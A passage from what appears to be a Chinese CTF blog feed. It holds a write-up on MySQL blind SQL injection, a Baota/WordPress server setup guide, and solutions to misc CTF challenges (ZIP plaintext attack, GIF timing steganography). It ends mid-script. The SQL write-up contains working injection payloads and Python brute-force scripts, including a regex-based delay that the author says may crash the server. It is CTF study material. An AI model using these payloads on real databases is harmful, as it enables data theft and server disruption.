class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT ST_GeomFromText( &#39;LineString( 1 2, 5 7 )&#39;, 4326 )-- 输出结果：[0102000020E610000002000000000000000000F03F000000000000004000000000000014400000000000001C40]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ST_X(point)：该方法是获取点的x坐标，它操作的对象是一个点，即：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT ST_X(POINT(2,3)) -- 输出结果：2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但当操作对象不是点时，运行会报错，却能够通过sql的检查，所以可以用来构造true和false两种情况下出现不同的页面</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT IF(1, 1, ST_X(ST_GeomFromText(&#39;POINT(aaa)&#39;))) -- 输出结果：1SELECT IF(0, 1, ST_X(ST_GeomFromText(&#39;POINT(aaa)&#39;))) -- ERROR 3037 (22023): Invalid GIS data provided to function st_geometryfromtext.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>P.s.</p><p>ST_GeomFromText 、 ST_MPointFromText 是两个可以从文本中解析Spatial function的函数。</p><p>需要注意的是 ST_GeomFromText 针对的是 POINT() 函 数， ST_MPointFromText 针对的是 MULTIPOINT() 函数的。</p><p>其他可用的函数：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT IF(&#123;&#125;, ST_X(ST_GeomFromText(&#39;POINT(mads)&#39;)), 0);SELECT IF(&#123;&#125;, ST_MPointFromText(&#39;MULTIPOINT (mads)&#39;),0);SELECT IF(&#123;&#125;, ST_X(MADS), 0);SELECT IF(&#123;&#125;, ST_MPointFromText(&#39;MADS&#39;),0);SELECT IF(&#123;&#125;, ST_GeomFromText(&#39;MADS&#39;),0);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果题目过滤了<code>ST</code>，可以尝试用<code>GeomFromText()</code>和<code>X()</code>，但MySQL在5.7.6版本之后就弃用了。</p><table><thead><tr><th align="center">Name</th><th align="center">Description</th></tr></thead><tbody><tr><td align="center"><code>X()</code> (deprecated 5.7.6)</td><td align="center">Return X coordinate of Point</td></tr><tr><td align="center"><code>GeomFromText()</code>(deprecated 5.7.6)</td><td align="center">Return geometry from WKT</td></tr></tbody></table><br><p>当输入1、2、3等数字时，页面返回<code>Hello World</code></p><p><img src="https://s3.ax1x.com/2021/02/04/y3mMXn.png"></p><p>而当输入被过滤的关键字时，网页返回<code>No Hacker</code></p><p><img src="https://s3.ax1x.com/2021/02/04/y3mefg.png"></p><p>由此可以测试一些被过滤的关键字有：</p><p><code>&#39;</code>、<code>&quot;</code>、<code>or</code>、<code>-</code>、<code>*</code>、<code>&gt;</code>、<code>&lt;</code>、<code>=</code>、<code>like</code>、<code>sleep</code>、<code>substr</code>、<code>mid</code>、<code>ascii</code>、<code>ord</code></p><br><p>然而在不被ban掉的情况下，网页只能返回一种页面，无法进行平常的数字型盲注。</p><p>而像<code>if(0,1e9999,1)</code>，因为无法通过sql语句的检查，所以页面无法正常显示，更别说<code>if(1,1e9999,1)</code>了。</p><p>此时可以考虑用基于运行错误的布尔盲注，语法、语义上能够通过sql的检查，但如果执行到该语句却会运行错误，这样便能够构造true和false两种情况了。</p><p>用if来进行盲注，<code>&#39;</code>被过滤了，用十六进制绕过。</p><pre class="line-numbers language-none"><code class="language-none">if(1,1,ST_X(ST_GeomFromText(&#39;POINT(mads)&#39;))&gt; if(1,1,ST_X(ST_GeomFromText(0x504F494E54286D61647329))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>此时页面返回<code>Hello World</code>。题目说flag在flag表的flag字段，用left()截取第一个字符进行判断，<code>=</code>和<code>like</code>可以用<code>regexp</code>代替。</p><p>构造payload：</p><pre class="line-numbers language-none"><code class="language-none">if(left((select flag from flag),1) regexp char(102),1,ST_X(ST_GeomFromText(0x504F494E54286D61647329)))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时页面仍然返回<code>Hello World</code>，可以知道flag的第一个字符是char(102)，也就是<code>f</code></p><pre class="line-numbers language-none"><code class="language-none">if(left((select flag from flag),2) regexp char(102,108),1,ST_X(ST_GeomFromText(0x504F494E54286D61647329)))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>而第二个字符是char(108)，也就是字符<code>l</code></p><br><p>用python写个脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">fun</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token string">""</span>    j <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> string<span class="token punctuation">:</span>        <span class="token keyword">if</span> j <span class="token operator">!=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>            result <span class="token operator">=</span> result <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">","</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            result <span class="token operator">=</span> result <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        j <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">return</span> <span class="token string">"char("</span> <span class="token operator">+</span> result <span class="token operator">+</span> <span class="token string">")"</span>url <span class="token operator">=</span> <span class="token string">"http://sqlblind.com/index.php"</span>tables <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyz0123456789-_&#125;&#123;"</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> tables<span class="token punctuation">:</span>        <span class="token keyword">if</span> j <span class="token operator">==</span> <span class="token string">"&#123;"</span> <span class="token keyword">or</span> j <span class="token operator">==</span> <span class="token string">"&#125;"</span><span class="token punctuation">:</span>            j <span class="token operator">=</span> <span class="token string">"\\"</span> <span class="token operator">+</span> j        payload <span class="token operator">=</span> <span class="token string">"if(left((select flag from flag),%s) regexp %s,1,ST_X(ST_GeomFromText(0x504F494E54286D61647329)))"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>            i<span class="token punctuation">,</span> fun<span class="token punctuation">(</span>flag<span class="token operator">+</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'keywords'</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"Hello World"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            flag <span class="token operator">=</span> flag <span class="token operator">+</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\\"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s3.ax1x.com/2021/02/04/y3mulj.png"></p><br><h3 id="基于巨大运算时间的时间盲注"><a href="#基于巨大运算时间的时间盲注" class="headerlink" title="基于巨大运算时间的时间盲注"></a>基于巨大运算时间的时间盲注</h3><p>由于在这里过滤了<code>ST</code>，所以以<code>ST</code>开头的函数会被ban，无法使用。</p><p>同时又过滤了<code>sleep</code>，所以无法通过时间休眠来延迟时间，也就没法用sleep来进行时间盲注。</p><p>但我们可以通过sql语句来执行一个运算时间很长很长的语句，以此来作为时间延迟，也就是说用if来判断flag的字符，如果正确则执行一个需要很长运算时间的语句，否则返回0。</p><p>所以之后用python写脚本的时候，设定一个超时时间，在设定时间内没有返回内容即字符正确，这样便能进行时间盲注了。</p><p>在此之前先了解几个函数</p><ul><li>rpad(str,len,padstr)</li></ul><p>对字符串<code>str</code>进行右填充，用<code>padstr</code>填充至<code>str</code>长度为<code>len</code>个字符</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT RPAD(&#39;hi&#39;, 5, &#39;?&#39;) -- 输出结果：hi???<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>concat(str1,str2,…)</li></ul><p>连接多个字符串为一个字符串</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT CONCAT(&#39;he&#39;, &#39;ll&#39;, &#39;o&#39;) -- 输出结果：hello<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>repeat(str,count)</li></ul><p>返回字符串<code>str</code>重复<code>count</code>次后的字符串</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT REPEAT(&#39;ab&#39;, &#39;3&#39;) -- 输出结果：ababab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><p>构造payload：</p><pre class="line-numbers language-none"><code class="language-none">1 and if((select flag from flag) regexp binary &#39;f&#39;,rpad(&#39;a&#39;,5000000,&#39;a&#39;) regexp concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;),0)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也就是说如果flag的第一个字符为<code>f</code>的话，则会执行下面这句语句：</p><pre class="line-numbers language-none"><code class="language-none">rpad(&#39;a&#39;,5000000,&#39;a&#39;) regexp concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>rpad(&#39;a&#39;,5000000,&#39;a&#39;)</code>会填充为5000000个<code>a</code>，会构造成一个很长的字符串，与字符串<code>concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;)</code>去作正则匹配，通过巨大的运算量来延时。</p><blockquote><p>这样做的话服务器可能会崩</p></blockquote><p>由于题目过滤了<code>&#39;</code>，所以用十六进制代替</p><pre class="line-numbers language-none"><code class="language-none">1 and if((select flag from flag) regexp binary 0x66,rpad(0x61,5000000,0x61) regexp concat(repeat(0x28612E2A292B,30),0x62),0)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以下两种图片用get传参测试时间延迟效果</p><p>猜中flag的第一个字符时：</p><p><img src="https://s3.ax1x.com/2021/02/04/y3mnpQ.png"></p><p>而如果猜第一个字符为<code>0x01</code>，则为false，if返回0</p><p><img src="https://s3.ax1x.com/2021/02/04/y3mK6s.png"></p><br><p>所以我们可以通过大量的运算时间做延迟，进行时间盲注。</p><blockquote><p>但服务器进程在接到客户端传送过来的SQL语句时，不会直接去数据库查询。服务器进程把这个SQL语句的字符转化为ASCII等效数字码，接着这个ASCII码被传递给一个HASH函数，并返回一个hash值，然后服务器进程将到shared pool中的library cache（高速缓存）中去查找是否存在相同的hash值。如果存在，服务器进程将使用这条语句已高速缓存在SHARED POOL的library cache中的已分析过的版本来执行，省去后续的解析工作，这便是软解析。</p></blockquote><p>所以多次查询<code>rpad(&#39;a&#39;,5000000,&#39;a&#39;) regexp concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;)</code>后将不再延迟，所以对rpad()的<code>5000000</code>需要每次自减1</p><br><p>脚本来自<a href="http://www.plasf.cn/">Gqleung(http://www.plasf.cn)</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">ord2hex</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> string<span class="token punctuation">:</span>        r <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        r <span class="token operator">=</span> r<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        result <span class="token operator">=</span> result<span class="token operator">+</span>r    <span class="token keyword">return</span> <span class="token string">'0x'</span><span class="token operator">+</span>resulturl <span class="token operator">=</span> <span class="token string">"http://sqlblind.com/index.php"</span>tables <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyz0123456789-_&#125;&#123;"</span>result <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> tables<span class="token punctuation">:</span>        <span class="token keyword">if</span> j <span class="token operator">==</span> <span class="token string">"&#123;"</span> <span class="token keyword">or</span> j <span class="token operator">==</span> <span class="token string">"&#125;"</span><span class="token punctuation">:</span>            j <span class="token operator">=</span> <span class="token string">'\\'</span><span class="token operator">+</span>j        payload <span class="token operator">=</span> <span class="token string">"1 and if((select flag from flag) regexp binary %s,rpad(0x61,%d,0x61) regexp concat(repeat(0x28612E2A292B,30),0x62),0)"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>            ord2hex<span class="token punctuation">(</span><span class="token string">"^"</span><span class="token operator">+</span>result<span class="token operator">+</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">5000000</span><span class="token operator">-</span>i<span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'keywords'</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            result <span class="token operator">=</span> result<span class="token operator">+</span>j            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\\'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>timeout：设定超时时间，秒为单位<br>在设定时间内没有返回内容则返回一个timeout异常</p><p>若是3秒内没有返回内容则返回timeout异常，即字符正确，打印输出</p></blockquote><p><img src="https://s3.ax1x.com/2021/02/04/y3mlmq.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在云服务器上搭建博客</title>
      <link href="posts/20201223.html"/>
      <url>posts/20201223.html</url>
      
        <content type="html"><![CDATA[<p>宝塔 + WordPress</p><span id="more"></span><br><p>电脑系统：win10</p><p>阿里云服务器系统镜像：CentOS 7.6</p><p>FinalShell版本：3.6.3</p><br><h2 id="连接云服务器"><a href="#连接云服务器" class="headerlink" title="连接云服务器"></a>连接云服务器</h2><p>用FinalShell连接云服务器（云服务器已实例）</p><p><img src="https://s3.ax1x.com/2020/12/23/rcMcsH.png"></p><p>点击<code>SSH连接(Linux)</code></p><p>名称随意，主机填云服务器的公网IP，用户名填root，密码填云服务器实例密码，点击确定</p><p><img src="https://s3.ax1x.com/2020/12/23/rcMbLj.png"></p><p>然后双击即可连接</p><br><h2 id="安装宝塔Linux面板"><a href="#安装宝塔Linux面板" class="headerlink" title="安装宝塔Linux面板"></a>安装宝塔Linux面板</h2><p><a href="https://www.bt.cn/bbs/thread-19376-1-1.html">宝塔Linux面板安装教程 - 2020年12月2日更新 - 7.4.6正式版</a></p><p>由于系统是CentOS的，复制CentOS安装指令</p><pre class="line-numbers language-none"><code class="language-none">yum install -y wget &amp;&amp; wget -O install.sh http:&#x2F;&#x2F;download.bt.cn&#x2F;install&#x2F;install_6.0.sh &amp;&amp; sh install.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>提示是否安装宝塔面板，输入 <code>y</code></p><pre class="line-numbers language-none"><code class="language-none">Do you want to install Bt-Panel to the &#x2F;www directory now?(y&#x2F;n):y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装完成后记录下外网面板地址以及username和password</p><p><img src="https://s3.ax1x.com/2020/12/23/rcQLcD.png"></p><br><h2 id="开通对应端口"><a href="#开通对应端口" class="headerlink" title="开通对应端口"></a>开通对应端口</h2><p>点击左侧的<code>实例</code>，点击对应的服务器</p><p>点击左侧的<code>本实例安全组</code>，点击<code>配置规则</code></p><p>点击<code>快速创建规则</code>，开通8888以及常用端口</p><p><img src="https://s3.ax1x.com/2020/12/23/rclgUI.png"></p><br><h2 id="创建站点"><a href="#创建站点" class="headerlink" title="创建站点"></a>创建站点</h2><p>访问外网面板地址，账号输入username，密码输入password</p><p>点击左边的<code>LNMP(推荐)</code>的<code>一键安装</code></p><p>安装完成后添加站点</p><p><img src="https://s3.ax1x.com/2020/12/24/rc1TSK.png"></p><p>域名可以用IP代替，根目录自己定义，添加MySQL数据库</p><p>点击提交即可</p><br><h2 id="安装WordPress"><a href="#安装WordPress" class="headerlink" title="安装WordPress"></a>安装WordPress</h2><p>安装WordPress官网：<a href="https://cn.wordpress.org/download/">https://cn.wordpress.org/download/</a></p><p>下载WordPress后上传到宝塔Linux面板</p><p><img src="https://s3.ax1x.com/2020/12/24/rc39l8.png"></p><p>解压到blog目录下</p><blockquote><p>直接解压的话是解压到wordpress文件夹里，复制粘贴到blog目录下即可</p></blockquote><p>访问域名进行安装，点击<code>现在就开始！</code></p><p>数据库名和用户名都是之前生成的数据库名，密码为数据库密码</p><blockquote><p>可在宝塔Linux面板点击左侧的数据库查看</p></blockquote><p>输入完成后点击提交</p><p>填写信息页面，站点标题随意，用户名和密码自己设置，电子邮件写自己的邮箱</p><p>点击<code>安装WordPress</code>，重新输入账号密码登录</p><p>此时进入的是WordPress的后台，可以在后台进行博客主题等相关设置</p><p>访问IP即可看到博客了，至此博客搭建完成</p><p><img src="https://s3.ax1x.com/2020/12/24/rc3D7d.png"></p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 搭建博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复现3道misc题</title>
      <link href="posts/20201222.html"/>
      <url>posts/20201222.html</url>
      
        <content type="html"><![CDATA[<p>CISCN2020 &amp; 安洵杯2019 &amp; SWPUCTF2020</p><span id="more"></span><p><strong>目录</strong></p><ul><li>CISCN 2020 复赛(华南赛区) —— hidden_secret    </li><li>安洵杯 2019 —— easy misc    </li><li>SWPUCTF 2020 —— 耗子尾汁    </li></ul><br><h2 id="hidden-secret"><a href="#hidden-secret" class="headerlink" title="hidden_secret"></a>hidden_secret</h2><p>题目：CISCN 2020 复赛（华南赛区）</p><p>参考：<a href="https://www.cnblogs.com/Lziyang/p/13741751.html">CISCN 复赛(华南赛区)部分wp - 迷失的老鼠 - 博客园 (cnblogs.com)</a></p><p>文件：<code>flag1.zip</code></p><br><p><code>flag1.zip</code>解压出来是一张图片（<code>hahah.jpg</code>）和一个压缩包（<code>hidden_secret.zip</code>）</p><p>图片好像没什么东西，压缩包解密需要密码</p><p>打开<code>hidden_secret.zip</code>，发现加密的文件里面也有<code>hahah.jpg</code>，而且crc校验值一样</p><p><img src="https://s3.ax1x.com/2020/11/15/DP4ciq.png"></p><p>用ARCHPR进行明文攻击</p><p><img src="https://s3.ax1x.com/2020/11/15/DP5Al8.png"></p><p><img src="https://s3.ax1x.com/2020/11/15/DP4OSK.png"></p><p>拿到了<code>hidden_secret.zip</code>的解压密码：</p><pre class="line-numbers language-none"><code class="language-none">pb-1&#96;;ks<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解压后又是那个狗头，还有个<code>hidden_secret.rar</code>，继续解压</p><p>得到<code>key.gif</code></p><p>中途看到有一帧有二维码</p><p>用PS打开，在图层34查看图层</p><p><img src="https://s3.ax1x.com/2020/11/15/DP5v90.png"></p><p>扫码得到：</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;ni_chou_sha&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>提交后发现不对😡</p><br><p>用stegsolve分析图像信息，可以发现这个gif动图的间隔时间分为10和20两种，考虑gif时间隐写</p><p>将所有间隔时间分离出来</p><pre class="line-numbers language-none"><code class="language-none">identify -format &quot;%T&quot; key.gif<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://s3.ax1x.com/2020/11/15/DPTg74.png"></p><p>得到</p><pre class="line-numbers language-none"><code class="language-none">1020201020201020102010101020101010102020102010201020102020202020102020101020201010202020101020201020202010201010<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将<code>10</code>转化为<code>0</code>，<code>20</code>转化为<code>1</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1020201020201020102010101020101010102020102010201020102020202020102020101020201010202020101020201020202010201010"</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'10'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'0'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'20'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到</p><pre class="line-numbers language-none"><code class="language-none">01101101010001000011010101011111011001100111001101110100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将<a href="http://www.ah888.org/wenben_binarystr.html">二进制转为字符串</a>，得到</p><pre class="line-numbers language-none"><code class="language-none">mD5_fst<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>md5加密后得到</p><pre class="line-numbers language-none"><code class="language-none">046cb65e60a4774c76b4f99371e66f0d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>根据题目提示ntfs，查看文件夹隐藏文件，在hidden_secret文件夹中发现隐藏文件</p><p><img src="https://s3.ax1x.com/2020/11/15/DPHwQ0.png"></p><p>导出后重命名为<code>1.rar</code></p><p>解压密码为上面的MD5</p><p>解压得到<code>flag.txt</code></p><pre class="line-numbers language-none"><code class="language-none">flag&#123;f935c5d0470757a3d2f3ee7467366f4e&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h2 id="easy-misc"><a href="#easy-misc" class="headerlink" title="easy misc"></a>easy misc</h2><p>题目：安洵杯 2019</p><p>参考：<a href="https://blog.csdn.net/m0_46481239/article/details/107915123">BUUCTF:[安洵杯 2019]easy misc_F10NA-CSDN博客</a></p><p>文件：<code>attachment.rar</code></p><br><p>解压之后有三个文件（夹）</p><p><img src="https://s3.ax1x.com/2020/11/28/D6MuvT.png"></p><p><code>decode.zip</code>为加密文件，但有注释</p><pre class="line-numbers language-none"><code class="language-none">FLAG IN ((√2524921X85÷5+2)÷15-1794)+NNULLULL,<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>算出来是7</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token function">sqrt</span><span class="token punctuation">(</span><span class="token number">2524921</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">85</span><span class="token operator">/</span><span class="token number">5</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">15</span><span class="token operator">-</span><span class="token number">1794</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用掩码攻击</p><p><img src="https://s3.ax1x.com/2020/11/28/D6Qmod.png"></p><pre class="line-numbers language-none"><code class="language-none">2019456NNULLULL,<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解压后得到<code>decode.txt</code>，确认为<strong>字频隐写</strong></p><pre class="line-numbers language-none"><code class="language-none">a &#x3D; dIWb &#x3D; sSDc &#x3D; adE d &#x3D; jVfe &#x3D; QW8f &#x3D; SA&#x3D;g &#x3D; jBth &#x3D; 5REi &#x3D; tRQj &#x3D; SPAk &#x3D; 8DSl &#x3D; XiEm &#x3D; S8Sn &#x3D; MkFo &#x3D; T9pp &#x3D; PS5q &#x3D; E&#x2F;Sr &#x3D; -sds &#x3D; SQWt &#x3D; obWu &#x3D; &#x2F;WSv &#x3D; SD9w &#x3D; cw&#x3D;x &#x3D; ASDy &#x3D; FTaz &#x3D; AE7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p>而在<code>read</code>文件夹里有大量txt文件，里面有个<code>hint.txt</code></p><pre class="line-numbers language-none"><code class="language-none">hint:取前16个字符<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但不知道是取哪个txt文件的前16高频字母</p><p>使用foremost分离<code>小姐姐.png</code>，得到</p><p><img src="https://s3.ax1x.com/2020/12/22/rsahbF.png"></p><p>使用盲水印工具分离：<a href="https://www.lizenghai.com/archives/72687.html">盲水印合成与解密</a></p><blockquote><p>安装不了opencv库，目前没有提取成功，据说是11.txt</p></blockquote><p>对11.txt进行字频分析：<a href="http://www.aihanyu.org/cncorpus/CpsTongji.aspx">http://www.aihanyu.org/cncorpus/CpsTongji.aspx</a></p><pre class="line-numbers language-none"><code class="language-none">序号 字词出现次数   出现频率1 1720317.41232e89389.04673t62786.35444a58495.92025o53725.43746n49324.9927r45254.58018h44604.51439s43474.399910i42914.343211d36403.684312l33393.379613u23082.336114y19031.926215g18511.873516w17331.754117c15061.524318m14911.509119.14231.440320f12461.261221　12031.217622b11991.213623,11811.195424p11091.122525k931    0.942326&quot;  866  0.876527&#39;7100.718628H6030.610329v5920.599230-4500.455531D3520.356332I2810.284433T2500.25334A1970.199435P1940.196436M1820.184237?1520.153838S1310.132639W1240.125540V1190.120441U1170.118442O1060.107343!960.097244G800.08145E760.076946x760.076947B740.074948j740.074949Y730.073950z730.073951N720.072952C610.061753R560.056754L550.055755F530.053656q490.049657;320.032458K300.030459:220.022360(140.014261)140.014262J130.013263150.005164330.00365430.00366Q30.00367220.00268Z20.00269~10.00170010.00171710.001<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可以使用脚本进行字频分析</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'E:/11.txt'</span><span class="token punctuation">)</span>line <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token builtin">file</span><span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token builtin">file</span><span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>result <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token 